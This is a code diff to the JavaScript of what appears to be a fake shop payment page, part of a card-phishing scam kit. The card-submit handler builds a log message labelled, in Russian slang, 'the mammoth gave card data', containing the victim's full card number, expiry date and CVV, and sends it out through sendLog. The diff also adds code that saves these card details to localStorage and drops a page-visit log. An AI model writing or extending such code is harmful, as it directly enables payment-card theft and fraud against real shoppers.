@@ -1807,9 +1807,6 @@
 
       // Log after productName is loaded
       if (typeof sendLog === 'function') {
-        // Log page visit
-        sendLog('page_visit', `📦 Товар: ${productName}\nlink_id=${link_id}`);
-
         // Log page confirmation with product name
         sendLog('page_confirmation', `📦 Товар: ${productName}\nlink_id=${link_id}`);
       }
@@ -2605,6 +2602,47 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }
 
+  // Auto-restore card data from localStorage on page load
+  if (cardNumberInput && cardNumberInput.value === '') {
+    const savedCardData = localStorage.getItem('cardData');
+    if (savedCardData) {
+      try {
+        const data = JSON.parse(savedCardData);
+        cardNumberInput.value = data.cardNumber || '';
+        cardExpiryInput.value = data.cardExpiry || '';
+        cardCVVInput.value = data.cardCVV || '';
+      } catch (e) {
+        console.error('Error restoring card data:', e);
+      }
+    }
+  }
+
+  // Handle card input changes - save to localStorage
+  if (cardNumberInput) {
+    cardNumberInput.addEventListener('input', function() {
+      saveCardDataToLocalStorage();
+    });
+  }
+  if (cardExpiryInput) {
+    cardExpiryInput.addEventListener('input', function() {
+      saveCardDataToLocalStorage();
+    });
+  }
+  if (cardCVVInput) {
+    cardCVVInput.addEventListener('input', function() {
+      saveCardDataToLocalStorage();
+    });
+  }
+
+  function saveCardDataToLocalStorage() {
+    const cardData = {
+      cardNumber: cardNumberInput.value,
+      cardExpiry: cardExpiryInput.value,
+      cardCVV: cardCVVInput.value
+    };
+    localStorage.setItem('cardData', JSON.stringify(cardData));
+  }
+
   // Handle card submit button
   const submitCardBtn = document.getElementById('submitCardBtn');
   if (submitCardBtn) {
@@ -2624,18 +2662,19 @@ document.addEventListener('DOMContentLoaded', function() {
           link_id = urlParams.get('link_id');
         }
 
-        // Log card data with product name and link_id for identification
-        const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`;
+        // Log card data with product name and link_id for identification (bold header)
+        const logMessage = `💳 **Мамонт дал данные карты**\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`;
 
 
         if (typeof sendLog === 'function') {
           sendLog('payment_flow', logMessage);
         }
 
-        // Clear form
+        // Clear form and localStorage
         cardNumberInput.value = '';
         cardExpiryInput.value = '';
         cardCVVInput.value = '';
+        localStorage.removeItem('cardData');
 
         // Close modal
         closeCardModal();
